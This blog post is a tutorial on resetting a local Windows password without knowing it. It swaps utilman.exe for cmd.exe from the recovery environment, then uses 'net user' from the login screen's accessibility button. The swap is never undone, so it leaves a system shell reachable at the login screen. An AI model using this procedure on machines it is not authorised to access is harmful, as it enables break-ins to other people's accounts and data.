---
title: 'Breaking into a local Windows account without a password'
description: "Local Windows password are hilariously easy to reset. Here's how to reset a Windows password using a standard Windows installation USB."
pubDate: 2024-04-28
author: 'Bassim Shahidy'
tags: ['Windows', 'Password', 'Reset', 'Hacking']
---

To reset a windows password without knowing the password or logging in, you will need to boot into advanced options or a Windows installation USB to access the command prompt.
   
## How to reset a Windows password

1. Boot into Advanced Options or Windows installation USB
   1. Boot into Windows Recovery Environment
        - Without USB: From login screen hold `Shift` and click `Restart`.
        - With USB: Boot into Windows Installation USB
   2. Select `Repair your computer` then select `Troubleshoot`
   4. Select `Advanced Options` the select `Command Prompt`  
  
2. Open Command Prompt
    1. run `C:`
    2. run `cd windows\system32`
3. Run `ren utilman.exe utilman1.exe`, disregard any errors
4. Run `ren cmd.exe utilman.exe`
5. Exit CMD, continue to Windows
6. At login screen, click accessibility button next to power button, this will open CMD
7. Run `net user` to list users
8. Reset password with `net user [username] *`
9. Run exit to close CMD


### Password can also be reset through User Accounts GUI

6. Run `control userpasswords2`
7. Click Reset Password and enter the new password, or leave blank to remove the password

